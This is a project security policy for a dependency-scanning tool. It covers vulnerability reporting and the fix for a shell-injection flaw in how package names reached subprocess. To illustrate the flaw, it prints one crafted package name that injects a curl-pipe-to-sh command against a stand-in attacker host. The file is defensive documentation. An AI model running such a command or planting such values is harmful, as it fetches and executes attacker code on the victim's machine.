# Security Policy

## Supported Versions

| Version | Supported |
|---------|-----------|
| latest  | ✅        |

## Reporting a Vulnerability

Please **do not** open a public GitHub issue for security vulnerabilities.
Instead, e-mail the maintainers directly or use GitHub's
[private vulnerability reporting](https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing/privately-reporting-a-security-vulnerability)
feature.  You should receive an acknowledgement within 48 hours.

---

## Security Considerations

### Package-Name Injection (issue \#119)

#### Background

`depscan` calls external tools such as `npm audit` via `subprocess`.  Earlier
versions constructed the command as a shell string and passed it to
`subprocess.run(..., shell=True)`.  An attacker who could influence the package
name (e.g. via a crafted `package-lock.json` or a malicious CLI argument) could
inject arbitrary shell commands:

```text
# Malicious package name in a lock file
"; curl https://evil.example/payload | sh #"
```

#### Fix

Two complementary safeguards were introduced in `depscan/scanner.py`:

1. **Strict allowlist regex** — `SAFE_PACKAGE_NAME_RE`  
   Only the characters `[a-zA-Z0-9._-]` are accepted in a package name.
   Anything else is an injection attempt.

   ```python
   SAFE_PACKAGE_NAME_RE = re.compile(r'^[a-zA-Z0-9._-]+$')
   ```

2. **`validate_package_name(name: str)` guard**  
   Every code path that passes a package name to a subprocess **must** call
   this function first.  It raises `ValueError("Invalid package name")` for
   any non-conforming input, so the subprocess is never reached.

   ```python
   def validate_package_name(name: str) -> None:
       if not SAFE_PACKAGE_NAME_RE.match(name):
           raise ValueError("Invalid package name")
   ```

3. **`shell=False` with an argument list**  
   The subprocess call uses a list of arguments instead of a shell string, and
   `shell=False` (the default) is set explicitly.  Even if the regex were somehow
   bypassed, the OS would treat the package name as a single argument rather than
   as a shell command.

   ```python
   result = subprocess.run(
       ["npm", "audit", "--json", package],
       shell=False,
       capture_output=True,
       text=True,
       check=False,
   )
   ```

#### Guidelines for contributors

- **Always** call `validate_package_name()` before using any user-supplied name
  in a subprocess call.
- **Never** use `shell=True` or build a subprocess command by string concatenation
  / f-string interpolation with untrusted data.
- **Always** pass commands as a `list[str]` to `subprocess.run`.
- New validators for other identifier types (version strings, ecosystem names, …)
  should follow the same allowlist-regex + `ValueError` pattern.

---

## Dependency Scanning Best Practices

`depscan` itself follows these practices to stay secure:

- All dependencies are pinned in `pyproject.toml` and verified via lock files.
- CI runs `depscan` against its own dependency graph on every pull request.
- Typosquat detection is enabled by default.
